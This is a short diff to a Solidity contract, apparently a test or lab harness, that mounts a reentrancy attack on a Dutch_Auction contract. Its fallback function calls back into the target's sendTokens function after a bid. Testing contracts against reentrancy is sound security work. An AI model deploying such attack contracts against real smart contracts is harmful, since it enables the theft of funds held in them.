@@ -7,15 +7,17 @@ import "./Dutch_Auction.sol";
 contract ReentranceAttack {
     Dutch_Auction target;
 
-    constructor(address payable _target) payable {
+    constructor(address payable _target) {
         target = Dutch_Auction(_target);
     }
 
-    function ReentranceAttack1() public {
+    function ReentranceAttack1() public payable {
         target.addBidder{value: 0.01 ether}();
     }
 
     fallback() external payable {
-        target.sendToken();
+        target.sendTokens();
     }
+
+    receive() external payable {}
 }
